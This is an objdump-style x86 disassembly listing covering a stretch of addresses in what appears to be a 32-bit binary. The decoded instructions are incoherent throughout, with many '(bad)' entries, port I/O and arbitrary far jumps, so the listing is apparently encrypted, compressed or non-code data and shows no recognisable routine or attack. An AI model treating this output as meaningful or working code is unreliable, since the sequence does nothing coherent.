  40dc4e:	in     al,0xfe
  40dc50:	inc    ebp
  40dc51:	and    ebp,DWORD PTR [ebx-0x5b]
  40dc54:	add    al,0x9d
  40dc56:	xor    ecx,DWORD PTR [ebp-0x45]
  40dc59:	xchg   ch,ah
  40dc5b:	sti    
  40dc5c:	test   DWORD PTR [ebx],0xa0dd0c2a
  40dc62:	and    bl,dh
  40dc64:	push   esi
  40dc65:	sbb    al,0xe0
  40dc67:	enter  0x1a3c,0x70
  40dc6b:	or     al,0x12
  40dc6d:	inc    edi
  40dc6e:	xchg   esp,eax
  40dc6f:	std    
  40dc70:	imul   edx,DWORD PTR [ecx],0xffffffd2
  40dc73:	mov    ah,0xe4
  40dc75:	sub    BYTE PTR [ebx],dh
  40dc77:	and    esp,DWORD PTR [ebx-0x77]
  40dc7a:	cmp    esp,DWORD PTR ds:0xe9b41c1
  40dc80:	jmp    0xfcebbc7b
  40dc85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc86:	or     BYTE PTR [esi+0x582f8f34],dh
  40dc8c:	adc    esi,DWORD PTR [edi+0x6a6e67cf]
  40dc92:	enter  0x6f62,0x3
  40dc96:	fstp   TBYTE PTR [eax]
  40dc98:	mov    ss,ebp
  40dc9a:	sbb    eax,0x8b2f07e5
  40dc9f:	or     eax,0xaa606e8b
  40dca4:	ins    BYTE PTR es:[edi],dx
  40dca5:	mov    bh,0xbc
  40dca7:	(bad)  
  40dca8:	scas   al,BYTE PTR es:[edi]
  40dca9:	push   ebp
  40dcaa:	lea    ebx,[ecx]
  40dcac:	ins    BYTE PTR es:[edi],dx
  40dcad:	fadd   DWORD PTR [esi]
  40dcaf:	leave  
  40dcb0:	outs   dx,BYTE PTR ds:[esi]
  40dcb1:	mov    edx,0xc2fb3a2c
  40dcb6:	and    DWORD PTR [esi-0x8],0x40
  40dcba:	ret    
  40dcbb:	jmp    0xb54f:0xf03946a7
  40dcc2:	pop    edi
  40dcc3:	out    0x27,eax
  40dcc5:	call   0x2d2f:0x648c46cd
  40dccc:	and    eax,0x6c668dab
  40dcd1:	xchg   BYTE PTR [edi-0x48],bh
  40dcd4:	mov    bl,0xaf
  40dcd6:	mov    WORD PTR [edi],ss
  40dcd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcd9:	test   al,0x37
  40dcdb:	lods   eax,DWORD PTR ds:[esi]
  40dcdc:	pushf  
  40dcdd:	clc    
  40dcde:	(bad)  
  40dcdf:	mov    cl,0xad
  40dce1:	shl    DWORD PTR [edx-0x44],cl
  40dce4:	and    ch,BYTE PTR [ebx+0x65]
  40dce7:	test   eax,0xff776b38
  40dcec:	stos   DWORD PTR es:[edi],eax
  40dced:	jns    0x40dc74
  40dcef:	jbe    0x40dd05
  40dcf1:	lea    esp,[ecx+0x24437f95]
  40dcf7:	xchg   ecx,eax
  40dcf8:	bnd ja 0x40dc82
  40dcfb:	(bad)  
  40dcfc:	pusha  
  40dcfd:	pop    esi
  40dcfe:	call   0x6e0d3655
  40dd03:	jmp    0xd1d53616
  40dd08:	mov    edi,0x649af7c1
  40dd0d:	clc    
  40dd0e:	popa   
  40dd0f:	mov    bl,0xf0
  40dd11:	push   ebx
  40dd12:	dec    edx
  40dd13:	aam    0x6d
  40dd15:	enter  0x9813,0x73
  40dd19:	fwait
  40dd1a:	jmp    0x8031:0x3e3243ee
  40dd21:	xchg   edi,eax
  40dd22:	enter  0xa3b0,0x7b
  40dd26:	rol    BYTE PTR [esi],cl
  40dd28:	jnp    0x40dd05
  40dd2a:	imul   ebp,DWORD PTR [ebp+0x0],0x2064c423
  40dd31:	ja     0x40dd48
  40dd33:	stos   BYTE PTR es:[edi],al
  40dd34:	and    al,0xa1
  40dd36:	popf   
  40dd37:	jmp    0xb25aee97
  40dd3c:	and    DWORD PTR [edx-0x451fa4ec],0xa9acb7eb
  40dd46:	adc    ebx,DWORD PTR ds:0xe1487951
  40dd4c:	or     BYTE PTR ds:0x1e99bf69,0xeb
  40dd53:	leave  
  40dd54:	jbe    0x40dd8f
  40dd56:	push   edi
  40dd57:	sub    al,0x5e
  40dd59:	xor    al,0xb0
  40dd5b:	leave  
  40dd5c:	imul   eax,DWORD PTR [ebx+0x24d97e32],0xfffffffc
  40dd63:	and    eax,0x11168c0a
  40dd68:	mov    dh,0x1f
  40dd6a:	addr16 ret 0x70c8
  40dd6e:	call   FWORD PTR [edx-0x29]
  40dd71:	mov    edi,0x8dcd4ef
  40dd76:	rcl    DWORD PTR [ebp+0x49],0xa2
  40dd7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd7b:	or     al,0xab
  40dd7d:	mov    es,ecx
  40dd7f:	std    
  40dd80:	push   esi
  40dd81:	repnz add BYTE PTR ds:0xf039bb9,bl
  40dd88:	sbb    DWORD PTR [esi],eax
  40dd8a:	add    esi,DWORD PTR [edx+edi*2+0x6b]
  40dd8e:	and    ebx,esi
  40dd90:	jecxz  0x40dd77
  40dd92:	rcl    ecx,cl
  40dd94:	push   ebx
  40dd95:	sbb    ecx,DWORD PTR [eax+0x1a]
  40dd98:	loop   0x40dd3b
  40dd9a:	popf   
  40dd9b:	add    eax,0x48da798f
  40dda0:	dec    edx
  40dda1:	cwde   
  40dda2:	xchg   edi,eax
  40dda3:	ret    0xa0a
  40dda6:	xchg   DWORD PTR [edi],ecx
  40dda8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dda9:	mov    al,BYTE PTR [edi-0x18]
  40ddac:	jb     0x40dd2f
  40ddae:	pop    ebx
  40ddaf:	mov    cl,0xc9
  40ddb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddb2:	ror    esi,cl
  40ddb4:	mov    cl,0xba
  40ddb6:	mov    esi,0xdbc52e68
  40ddbb:	or     BYTE PTR [edx-0x6f53c9e6],0xae
  40ddc2:	jbe    0x40dd99
  40ddc4:	enter  0x9471,0x12
  40ddc8:	jmp    0x40dd95
  40ddca:	xlat   BYTE PTR ds:[ebx]
  40ddcb:	inc    edx
  40ddcc:	cmc    
  40ddcd:	es jnp 0x40dd82
  40ddd0:	lea    edx,[ebx]
  40ddd2:	sbb    edi,esi
  40ddd4:	imul   ebx,DWORD PTR [ebx],0x38
  40ddd7:	jmp    0x40de39
  40ddd9:	mov    eax,ds:0x3591e75b
  40ddde:	xchg   esi,eax
  40dddf:	and    edx,DWORD PTR [eax]
  40dde1:	mov    eax,ds:0x6626c4f1
  40dde6:	dec    ecx
  40dde7:	or     dh,BYTE PTR [esi+0x54]
  40ddea:	enter  0xea3,0x3c
  40ddee:	loopne 0x40dd8e
  40ddf0:	shr    DWORD PTR [ebp+0x7],cl
  40ddf3:	fdiv   DWORD PTR [edx]
  40ddf5:	or     DWORD PTR [ebx+0x53ad8c75],ecx
  40ddfb:	jmp    0x903b2e0c
  40de00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de01:	sub    eax,0x1b6edea2
  40de06:	fld    st(2)
  40de08:	push   ebx
  40de09:	mov    esi,0xe2c16dec
  40de0e:	lock pop ebp
  40de10:	and    eax,0xae71bbf2
  40de15:	xchg   esi,eax
  40de16:	lahf   
  40de17:	dec    esi
  40de18:	(bad)  
  40de19:	mov    ebx,ecx
  40de1b:	inc    esi
  40de1c:	rol    BYTE PTR ds:0x4df9e47c,0x7e
  40de23:	je     0x40dea1
  40de25:	clc    
  40de26:	and    DWORD PTR [edx],ebx
  40de28:	fstp   QWORD PTR [ecx+0x47]
  40de2b:	mov    ds:0xe057b103,eax
  40de30:	test   eax,0xfa21f816
  40de35:	mov    ebp,0x1df1e76f
  40de3a:	lahf   
  40de3b:	adc    DWORD PTR [ebx],edx
  40de3d:	imul   edx,DWORD PTR cs:[ebp-0x3b],0xb6b7a4a4
  40de45:	push   eax
  40de46:	retf   0xcd42
  40de49:	lods   eax,DWORD PTR ds:[esi]
  40de4a:	(bad)  
  40de4c:	cli    
  40de4d:	out    0xd2,al
  40de4f:	xchg   edx,eax
  40de50:	sbb    ch,ch
  40de52:	jne    0x40de09
  40de54:	mov    DWORD PTR [edx],esi
  40de56:	popa   
  40de57:	mov    ebp,0x6cd565e2
  40de5c:	adc    al,bh
  40de5e:	ds imul esp,ebp,0x1a972361
  40de65:	scas   al,BYTE PTR es:[edi]
  40de66:	bound  esp,QWORD PTR [edx+0x1699f78e]
  40de6c:	leave  
  40de6d:	jle    0x40ddfe
  40de6f:	stc    
  40de70:	std    
  40de71:	fld    QWORD PTR ds:0x1ea0c8b4
  40de77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de78:	inc    edx
  40de79:	sbb    al,0x71
  40de7c:	retf   
  40de7d:	jge    0x40deae
  40de7f:	mov    ah,0xb5
  40de81:	test   eax,0x87e8e9e0
  40de86:	adc    eax,0x4ece63a7
  40de8b:	lds    edi,FWORD PTR [edx+0x7a]
  40de8e:	ins    BYTE PTR es:[edi],dx
  40de8f:	or     DWORD PTR [edi-0x40acd66b],edi
  40de95:	xor    DWORD PTR [ecx+edi*8+0x7c0c89d8],eax
  40de9c:	push   esp
  40de9d:	mov    cl,0x9b
  40de9f:	shr    DWORD PTR [esi-0xf],1
  40dea2:	push   esp
  40dea3:	cwde   
  40dea4:	stos   DWORD PTR es:[edi],eax
  40dea5:	(bad)  
  40dea6:	addr16 call 0xbcf17707
  40deac:	push   0x6b
  40deae:	inc    ebx
  40deaf:	std    
  40deb0:	aad    0xb3
  40deb2:	inc    ecx
  40deb3:	in     eax,0xe3
  40deb5:	xchg   DWORD PTR [ebx+0x64],esi
  40deb8:	xchg   BYTE PTR [edx],al
  40deba:	xor    bl,BYTE PTR [edx]
  40debc:	cmp    edi,DWORD PTR [ebx-0x28]
  40debf:	adc    ebx,DWORD PTR [ebp-0x59]
  40dec2:	dec    ecx
  40dec3:	cmp    bh,BYTE PTR [ebx+0x7d7c1a36]
  40dec9:	and    eax,0x389c73f9
  40dece:	dec    BYTE PTR [ebx+ebp*8+0x51]
  40ded2:	adc    bh,dh
  40ded4:	loope  0x40de80
  40ded6:	mov    dl,0xeb
  40ded8:	cwde   
  40ded9:	or     al,0x40
  40dedb:	pop    esp
  40dedc:	mov    esp,0xfdd2b555
  40dee1:	cmp    DWORD PTR [eax],ebp
  40dee3:	hlt    
  40dee4:	aam    0xf8
  40dee6:	stc    
  40dee7:	mov    al,bl
  40dee9:	les    esp,FWORD PTR [edi-0x77]
  40deec:	retf   
  40deed:	inc    ecx
  40deee:	push   edx
  40deef:	mov    bl,0xdf
  40def1:	mov    al,ds:0x9c87bbd9
  40def6:	adc    edx,0x288148ea
  40defc:	leave  
  40defd:	sbb    al,0xd7
  40deff:	mov    WORD PTR [edi-0x3a],gs
  40df02:	stos   BYTE PTR es:[edi],al
  40df03:	lods   al,BYTE PTR ds:[esi]
  40df04:	or     edx,ebx
  40df06:	pusha  
  40df07:	in     eax,0x2e
  40df09:	mov    ch,0xbe
  40df0b:	in     eax,0x70
  40df0d:	and    edi,esi
  40df0f:	and    eax,0x426fdf13
  40df14:	fcomp  DWORD PTR [ebx+0x4b]
  40df17:	(bad)  
  40df18:	out    0xdd,al
  40df1a:	push   ss
  40df1b:	add    ebp,DWORD PTR [esi-0x4d5f1af9]
  40df21:	or     eax,0xcbd7e890
  40df26:	push   ebp
  40df27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df28:	jbe    0x40df24
  40df2a:	sub    DWORD PTR [edi-0x6a],esi
  40df2d:	push   edx
  40df2e:	mov    WORD PTR [esi-0x7a],?
  40df31:	mov    ecx,0xebab876b
  40df36:	ror    DWORD PTR [ebx],cl
  40df38:	jecxz  0x40def6
  40df3a:	data16 loop 0x40defc
  40df3d:	and    eax,0xc838e3bd
  40df42:	idiv   DWORD PTR [ecx+0x602af3a6]
  40df48:	fs and esp,ecx
  40df4b:	xlat   BYTE PTR ds:[ebx]
  40df4c:	aaa    
  40df4d:	inc    esp
  40df4e:	mov    edi,0xaf27f4de
  40df53:	mov    dl,0x8
  40df55:	fldenv [ebp-0x77]
  40df58:	mov    cl,0x21
  40df5a:	jbe    0x40df02
  40df5c:	clc    
  40df5d:	push   0x345b4fd2
  40df62:	jle    0x40dfd3
  40df64:	sub    ch,BYTE PTR [ebx+ecx*4]
  40df67:	and    eax,0x372d79d5
  40df6c:	add    al,0x2
  40df6e:	bound  ebp,QWORD PTR [edi+0x1e]
  40df71:	jb     0x40df16
  40df73:	sbb    DWORD PTR [edi],ebx
  40df75:	pop    edi
  40df76:	and    edx,ebp
  40df78:	sbb    BYTE PTR [edx+0x12],ch
  40df7b:	adc    DWORD PTR [edi],ebp
  40df7d:	xor    al,0x80
  40df7f:	cmp    eax,0xd988b63e
  40df84:	(bad)  
  40df85:	xchg   ebx,eax
  40df86:	add    BYTE PTR [esi],al
  40df88:	jbe    0x40df2e
  40df8a:	call   0xc2412f2
  40df8f:	inc    edx
  40df90:	dec    eax
  40df91:	sti    
  40df92:	ins    DWORD PTR es:[edi],dx
  40df93:	mov    al,BYTE PTR [edx]
  40df95:	add    esp,DWORD PTR [ebx-0x36]
  40df98:	and    ah,BYTE PTR [edi+eax*4+0x7f903210]
  40df9f:	jmp    0xf8a8:0x5a8035f6
  40dfa6:	mov    edi,0x82c0ef48
  40dfab:	les    edx,FWORD PTR [esi]
  40dfad:	pop    ebx
  40dfae:	sub    eax,0xc13bf72
  40dfb3:	xor    ebp,DWORD PTR [edx-0x35]
  40dfb6:	add    edi,DWORD PTR [edx+0x67]
  40dfb9:	test   eax,0x3e2a677d
  40dfbe:	mov    ebp,0x52fe830b
  40dfc3:	push   esp
  40dfc4:	mov    ah,0xf3
  40dfc6:	mov    DWORD PTR [esi],ecx
  40dfc8:	jo     0x40dfcc
  40dfca:	mov    ds:0x5c40747b,eax
  40dfcf:	and    al,0x6f
  40dfd1:	das    
  40dfd2:	sub    dl,bh
  40dfd4:	leave  
  40dfd5:	aaa    
  40dfd6:	adc    ah,dl
  40dfd8:	rcr    BYTE PTR [ebp-0x36],0xf9
  40dfdc:	neg    DWORD PTR [edi+0x2b]
  40dfdf:	addr16 and al,0x9f
  40dfe2:	add    eax,0xe2fca4ba
  40dfe7:	(bad)  
  40dfe8:	pushf  
  40dfe9:	add    eax,0xca37ac17
  40dfee:	xor    ch,BYTE PTR [ebp-0x3f]
  40dff1:	xor    BYTE PTR [eax+0x35],dh
  40dff4:	(bad)  
  40dff5:	pushf  
  40dff6:	xchg   edx,eax
  40dff7:	rep ins BYTE PTR es:[edi],dx
  40dff9:	or     eax,DWORD PTR [ecx]
  40dffb:	ret    
  40dffc:	mov    esi,0xc25fc156
  40e001:	lods   eax,DWORD PTR ds:[esi]
  40e002:	and    eax,0x849e491c
  40e007:	(bad)  
  40e008:	ja     0x40e00b
  40e00a:	sub    ecx,DWORD PTR [esi]
  40e00c:	sar    BYTE PTR [ecx+0x4c2d5cfd],cl
  40e012:	adc    BYTE PTR [edx-0x44],bl
  40e015:	addr16 push esp
  40e017:	fwait
  40e018:	mov    ?,WORD PTR [edi]
  40e01a:	xor    BYTE PTR [ecx+ecx*4+0x77],dh
  40e01e:	xor    dl,BYTE PTR [eax]
  40e020:	outs   dx,BYTE PTR ds:[esi]
  40e021:	stos   BYTE PTR es:[edi],al
  40e022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e023:	outs   dx,DWORD PTR ds:[esi]
  40e024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e025:	add    al,0x9d
  40e027:	xor    DWORD PTR [esi],edx
  40e029:	icebp  
  40e02a:	mov    ah,0x1
  40e02c:	sbb    BYTE PTR es:[ebx+0x1251cb46],al
  40e033:	out    dx,eax
  40e034:	pop    ebp
  40e035:	jecxz  0x40dff8
  40e037:	push   ebp
  40e038:	call   0x9d3c4445
  40e03d:	and    eax,0xe9f617b
  40e042:	xor    BYTE PTR [edx+0x676c3a16],ah
  40e048:	cld    
  40e049:	stos   DWORD PTR es:[edi],eax
  40e04a:	mov    dl,0xd
  40e04c:	add    DWORD PTR [edx+0x23a688c5],0xffffff9b
  40e053:	xor    ebp,DWORD PTR [eax]
  40e055:	in     al,dx
  40e056:	(bad)  
  40e057:	fsub   st,st(4)
  40e059:	pop    es
  40e05a:	sbb    al,BYTE PTR [edx-0x5d64a5c7]
  40e060:	push   es
  40e061:	cmp    eax,0x9ea4c77
  40e066:	jne    0x40e097
  40e068:	(bad)  
  40e069:	jb     0x40e066
  40e06b:	jmp    0x40e050
  40e06d:	in     eax,dx
  40e06e:	test   BYTE PTR [ecx+edi*4+0x5b13c8ac],0x2
  40e076:	jmp    0xe9e8a7fe
  40e07b:	and    DWORD PTR [edx-0x4d3b488d],0xffffffd1
  40e082:	jae    0x40e0fd
  40e084:	pop    ss
  40e085:	fcmovne st,st(3)
  40e087:	xchg   edx,eax
  40e088:	jb     0x40e047
  40e08a:	scas   al,BYTE PTR es:[edi]
  40e08b:	mul    DWORD PTR [ebx+0x43]
  40e08e:	add    eax,0x21e007a4
  40e093:	pusha  
  40e094:	pop    ebp
  40e095:	test   eax,0xe2650689
  40e09a:	popf   
  40e09b:	mov    cl,0x91
  40e09d:	pop    ss
  40e09e:	xor    BYTE PTR [eax-0x40],bh
  40e0a1:	inc    edi
  40e0a2:	add    esi,eax
  40e0a4:	imul   BYTE PTR [ecx]
  40e0a6:	enter  0x75ae,0xc9
  40e0aa:	retf   
  40e0ab:	ins    BYTE PTR es:[edi],dx
  40e0ac:	int3   
  40e0ad:	test   BYTE PTR [ebx+0xe8462e7],bl
  40e0b3:	cdq    
  40e0b4:	stos   DWORD PTR es:[edi],eax
  40e0b5:	sub    esi,0x2d
  40e0b8:	loope  0x40e0c7
  40e0ba:	retf   
  40e0bb:	(bad)  
  40e0bc:	int3   
  40e0bd:	mov    bh,BYTE PTR [ebx+edi*1]
  40e0c0:	jbe    0x40e057
  40e0c2:	stos   DWORD PTR es:[edi],eax
  40e0c3:	(bad)  
  40e0c4:	cmp    ch,0xe6
  40e0c7:	repnz mov ebp,0x8de32d14
  40e0cd:	cmp    ch,dh
  40e0cf:	out    0xee,eax
  40e0d1:	dec    ecx
  40e0d2:	xchg   ebp,eax
  40e0d3:	mov    DWORD PTR [ebp-0x6ccd1b79],edi
  40e0d9:	daa    
  40e0da:	in     al,dx
  40e0db:	push   es
  40e0dc:	mov    eax,0xf1eee645
  40e0e1:	push   es
  40e0e2:	in     eax,0xfd
  40e0e4:	push   edi
  40e0e5:	push   esp
  40e0e6:	rcl    DWORD PTR [eax-0x1e],0xf7
  40e0ea:	ret    0x471a
  40e0ed:	int3   
  40e0ee:	jmp    0x57612865
  40e0f3:	ss ds pop ds
  40e0f6:	(bad)  
  40e0f7:	push   ds
  40e0f8:	jp     0x40e0cc
  40e0fa:	sbb    edi,ecx
  40e0fc:	arpl   bp,bp
  40e0fe:	pop    edx
  40e0ff:	rol    BYTE PTR [esi-0x23f51e70],0x24
  40e106:	sbb    eax,0x669db5ab
  40e10b:	int3   
  40e10c:	retf   
  40e10d:	scas   eax,DWORD PTR es:[edi]
  40e10e:	loope  0x40e0a5
  40e110:	cmc    
  40e111:	pusha  
  40e112:	int3   
  40e113:	mov    dl,0xa9
  40e115:	aam    0xca
  40e117:	xchg   edi,eax
  40e118:	sub    al,0x8b
  40e11a:	mov    esp,0xe7582409
  40e11f:	add    ch,BYTE PTR [ebx+0x2bc9281c]
  40e125:	daa    
  40e126:	inc    esi
  40e127:	push   edi
  40e128:	repnz mov ch,0xb2
  40e12b:	mov    bl,0x1e
  40e12d:	xchg   esi,eax
  40e12e:	cmp    eax,0x688139fa
  40e133:	push   0xeaadc73b
  40e138:	fidivr DWORD PTR [esi-0x1b]
  40e13b:	jle    0x40e16b
  40e13d:	aaa    
  40e13e:	sub    bh,BYTE PTR [edi+0x5e3c3296]
  40e144:	iret   
  40e145:	xor    eax,0xf3d086cf
  40e14a:	add    ebx,eax
  40e14c:	imul   esp,DWORD PTR [edi],0xace373e
  40e152:	adc    edi,DWORD PTR [esi-0x55b298d1]
  40e158:	push   esi
  40e159:	imul   edi,DWORD PTR [eax],0x832840b7
  40e15f:	fcomp  QWORD PTR [edx]
  40e161:	lds    ecx,FWORD PTR [eax+0x12]
  40e164:	inc    ebp
  40e166:	jecxz  0x40e16b
  40e168:	lahf   
  40e169:	cld    
  40e16a:	push   es
  40e16b:	adc    eax,0xebc6e5d0
  40e170:	into   
  40e171:	aas    
  40e172:	stos   BYTE PTR es:[edi],al
  40e173:	stos   DWORD PTR es:[edi],eax
  40e174:	mov    bl,0x0
  40e176:	repnz or ebx,eax
  40e179:	fnstcw WORD PTR [edi]
  40e17b:	jns    0x40e18c
  40e17d:	ins    BYTE PTR es:[edi],dx
  40e17e:	rol    BYTE PTR [esi-0x79f2c00d],1
  40e184:	xor    edx,DWORD PTR [edi-0x5dd5414a]
  40e18a:	daa    
  40e18b:	fnstsw WORD PTR [ebx]
  40e18d:	xor    DWORD PTR es:[ebx-0x1f1b18d7],0xc4c7c4e4
  40e198:	cmp    esp,esp
  40e19a:	loope  0x40e1a8
  40e19c:	xor    BYTE PTR cs:[edi-0x627b3944],dl
  40e1a3:	(bad)  
  40e1a4:	pop    ecx
  40e1a5:	arpl   WORD PTR [edx+0x7b9e71df],bp
  40e1ab:	in     eax,0x7c
  40e1ad:	cmp    al,0x1b
  40e1af:	xchg   BYTE PTR [edi],bl
  40e1b1:	cmp    DWORD PTR [ebx-0x72bb21c2],ebx
  40e1b7:	add    dl,BYTE PTR [edi]
  40e1b9:	fimul  WORD PTR [ebx+0x199492af]
  40e1bf:	ins    BYTE PTR es:[edi],dx
  40e1c0:	loopne 0x40e1b0
  40e1c2:	xor    BYTE PTR [edx+eax*1+0x78],0x1
  40e1c7:	inc    ebp
  40e1c9:	retf   0x457e
  40e1cc:	dec    ebp
  40e1cd:	(bad)  
  40e1ce:	sar    BYTE PTR [ecx],1
  40e1d0:	pop    ds
  40e1d1:	out    dx,eax
  40e1d2:	sub    esi,DWORD PTR [edi+edx*2+0x7]
  40e1d6:	cmp    eax,0x5f08eb8f
  40e1db:	lds    eax,FWORD PTR [ebx-0x51]
  40e1de:	nop
  40e1df:	pop    ebp
  40e1e0:	ja     0x40e171
  40e1e2:	push   esi
  40e1e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1e4:	jo     0x40e203
  40e1e6:	push   edx
  40e1e7:	add    BYTE PTR [eax],ch
  40e1e9:	and    al,0xc5
  40e1eb:	repnz mov ah,0x7
  40e1ee:	out    dx,eax
  40e1ef:	sub    ebp,edx
  40e1f1:	fisttp WORD PTR [ebx-0x6bca104d]
  40e1f7:	mov    ch,0x74
  40e1f9:	cdq    
  40e1fa:	mov    ds:0xed596be1,eax
  40e1ff:	dec    esi
  40e200:	loop   0x40e234
  40e202:	xor    dl,BYTE PTR [edi+0x64fa9847]
  40e208:	lods   eax,DWORD PTR ds:[esi]
  40e209:	adc    esi,DWORD PTR [esi+0x39]
  40e20c:	xor    al,0xe3
  40e20e:	sub    DWORD PTR [edi-0x590bab0f],edi
  40e214:	mov    ecx,0x899f1f14
  40e219:	jae    0x40e223
  40e21b:	xor    BYTE PTR [edi+0x5b90e366],dh
  40e221:	or     ecx,DWORD PTR [eax+0x12]
  40e224:	inc    edx
  40e225:	mov    al,0xa7
  40e227:	pop    edx
  40e228:	hlt    
  40e229:	ins    BYTE PTR es:[edi],dx
  40e22a:	pop    ss
  40e22b:	mov    cl,0x8
  40e22d:	sub    BYTE PTR [ebp-0x5c],cl
  40e230:	mov    ds,WORD PTR [ecx+0x42e53597]
  40e236:	enter  0x9cb7,0xc
  40e23a:	adc    DWORD PTR [ecx+0x33],edx
  40e23d:	sti    
  40e23e:	into   
  40e23f:	cld    
  40e240:	sbb    edi,DWORD PTR [edi+0xfa81081]
  40e246:	shr    BYTE PTR [esi-0xfd0f728],1
  40e24c:	or     al,dl
  40e24e:	(bad)
  40e252:	add    esp,ecx
  40e254:	and    DWORD PTR [edx-0x73ab6958],ebx
  40e25a:	shl    DWORD PTR ds:[ecx],0xa2
  40e25e:	mov    edi,0xf00eb6fe
  40e263:	imul   edi,DWORD PTR [ecx],0x19
  40e266:	mov    cl,0x25
  40e268:	(bad)  
  40e269:	popa   
  40e26a:	xchg   esi,eax
  40e26b:	push   0x18
  40e26d:	pop    esi
  40e26e:	sbb    cl,cl
  40e270:	sahf   
  40e271:	mov    ebp,0x9728c857
  40e276:	(bad)  
  40e278:	rcl    BYTE PTR [ebx+0x48],0x35
  40e27c:	xor    ebp,eax
  40e27e:	inc    edi
  40e27f:	inc    esp
  40e280:	mov    cl,0xf1
  40e282:	jne    0x40e29b
  40e284:	mov    dl,0xfc
  40e286:	xchg   BYTE PTR [ecx],al
  40e288:	mov    ds:0xf5292f43,al
  40e28d:	fwait
  40e28e:	stos   BYTE PTR es:[edi],al
  40e28f:	pop    es
  40e290:	xchg   ebx,eax
  40e291:	jnp    0x40e29a
  40e293:	sub    al,0xb3
  40e295:	lock sub dl,BYTE PTR [edx-0x5effc150]
  40e29c:	es fsub st,st(7)
  40e29f:	(bad)  
  40e2a0:	leave  
  40e2a1:	in     al,0xca
  40e2a3:	xor    eax,0x44abcf4
  40e2a8:	(bad)  
  40e2a9:	nop
  40e2aa:	pushf  
  40e2ab:	mov    eax,ds:0xdb636049
  40e2b0:	imul   esp,DWORD PTR [edi+0x371ab961],0xc328bf17
  40e2ba:	or     al,0xe7
  40e2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2bd:	leave  
  40e2be:	ret    
  40e2bf:	inc    esp
  40e2c0:	xlat   BYTE PTR ds:[ebx]
  40e2c1:	retf   0xb50b
  40e2c4:	lods   eax,DWORD PTR ds:[esi]
  40e2c5:	xchg   ebx,eax
  40e2c6:	shl    BYTE PTR [ebx],cl
  40e2c8:	pushf  
  40e2c9:	adc    DWORD PTR [esi+0x27],esp
  40e2cc:	add    esp,DWORD PTR [edx]
  40e2ce:	lds    eax,FWORD PTR [esi+0x4e]
  40e2d1:	pop    ds
  40e2d2:	das    
  40e2d3:	lock enter 0x4124,0x54
  40e2d8:	clc    
  40e2d9:	icebp  
  40e2da:	sub    DWORD PTR [esi+0x29],edx
  40e2dd:	retf   
  40e2de:	cwde   
  40e2df:	adc    edx,DWORD PTR [edx-0x7466f4ad]
  40e2e5:	xor    al,0x4f
  40e2e7:	jmp    0x40e2fe
  40e2e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ea:	add    ch,ah
  40e2ec:	jge    0x40e28b
  40e2ee:	adc    BYTE PTR [esi+0x3c],ch
  40e2f1:	shr    DWORD PTR [edi-0x6c6ea908],1
  40e2f7:	fld    QWORD PTR [esi-0x4a]
  40e2fa:	mov    ds:0x2ab376e9,eax
  40e2ff:	xchg   DWORD PTR [ecx],ebp
  40e301:	adc    BYTE PTR [ecx],dl
  40e303:	fsub   DWORD PTR fs:[edi-0x6c]
  40e307:	lea    esi,[ebp+0x74a04a50]
  40e30d:	or     BYTE PTR [esi-0xb],0x13
  40e311:	pop    edx
  40e312:	push   0xbe274850
  40e317:	mov    es,esp
  40e319:	out    dx,eax
  40e31a:	and    ebx,esi
  40e31c:	in     eax,0x49
  40e31e:	sub    ah,dh
  40e320:	add    eax,0x31be00e3
  40e325:	xchg   edx,eax
  40e326:	mov    es,esp
  40e328:	in     eax,dx
  40e329:	(bad)  
  40e32a:	xor    al,dh
  40e32c:	or     ebp,DWORD PTR [ebp-0x34eecb02]
  40e332:	arpl   WORD PTR [edx-0x7923c552],si
  40e338:	ficom  DWORD PTR [edx-0x4331cbe3]
  40e33e:	pop    edi
  40e33f:	jecxz  0x40e3a1
  40e341:	ja     0x40e327
  40e343:	jmp    0x40e3b3
  40e345:	cs push edx
  40e347:	mov    esi,0x8055ec8c
  40e34c:	aaa    
  40e34d:	das    
  40e34e:	xchg   esi,eax
  40e34f:	sbb    al,0x79
  40e351:	dec    ecx
  40e352:	cdq    
  40e353:	montmul (bad)
  40e354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e355:	and    BYTE PTR [ebp+0x64],0x2a
  40e359:	jge    0x40e334
  40e35b:	inc    esi
  40e35c:	clc    
  40e35d:	xor    BYTE PTR [ebx+0x2a1093c8],cl
  40e363:	adc    ch,dh
  40e365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e366:	stc    
  40e367:	addr16 xchg ebp,eax
  40e369:	xchg   edi,eax
  40e36a:	xor    eax,0x6ea76ba1
  40e36f:	or     DWORD PTR [ecx+0x2b],edi
  40e372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e373:	popa   
  40e374:	push   ebp
  40e375:	lods   al,BYTE PTR ds:[esi]
  40e376:	mov    al,ds:0x88bd018
  40e37b:	jp     0x40e34b
  40e37d:	sbb    dl,bl
  40e37f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e380:	dec    esp
  40e381:	test   BYTE PTR [ecx-0x47],ch
  40e384:	push   esi
  40e385:	ins    BYTE PTR es:[edi],dx
  40e386:	jecxz  0x40e3f1
  40e388:	xor    esp,DWORD PTR [edi+ebp*4-0x2d9b3721]
  40e38f:	cmp    edi,DWORD PTR [esi+0x70944caf]
  40e395:	jle    0x40e368
  40e397:	push   edx
  40e398:	dec    ebx
  40e399:	retf   0xc1a2
  40e39c:	push   ss
  40e39d:	fdiv   st(4),st
  40e39f:	mov    WORD PTR [eax+0x32e2a7d9],ds
  40e3a5:	jno    0x40e387
  40e3a7:	lahf   
  40e3a8:	mov    bl,0xee
  40e3aa:	xchg   ebx,eax
  40e3ab:	dec    eax
